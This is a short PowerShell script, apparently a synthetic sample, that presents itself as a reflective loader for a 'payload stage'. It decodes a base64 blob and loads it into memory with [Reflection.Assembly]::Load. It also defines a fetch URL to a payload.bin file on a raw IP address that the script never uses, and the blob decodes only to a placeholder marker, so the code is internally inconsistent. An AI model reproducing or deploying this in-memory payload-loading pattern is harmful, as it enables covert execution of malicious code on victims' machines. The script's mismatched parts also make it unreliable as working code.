<#
.SYNOPSIS
    Reflective managed assembly loader.

.DESCRIPTION
    Obtains a managed payload stage, loads it into the current
    AppDomain and inspects the exported type count.
#>
$FetchUrl = "http://203.0.113.209/payload.bin"
$ErrorActionPreference = "Stop"

try {
    $PayloadBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjo0MndkNTBkeGt5')
    Write-Verbose ("Assembly byte count: " + $PayloadBytes.Length)
    $FetchResult = [Reflection.Assembly]::Load($PayloadBytes)
    if ($null -ne $FetchResult) {
        Write-Verbose ("Loaded assembly: " + $FetchResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
Set-Location -Path $env:TEMP
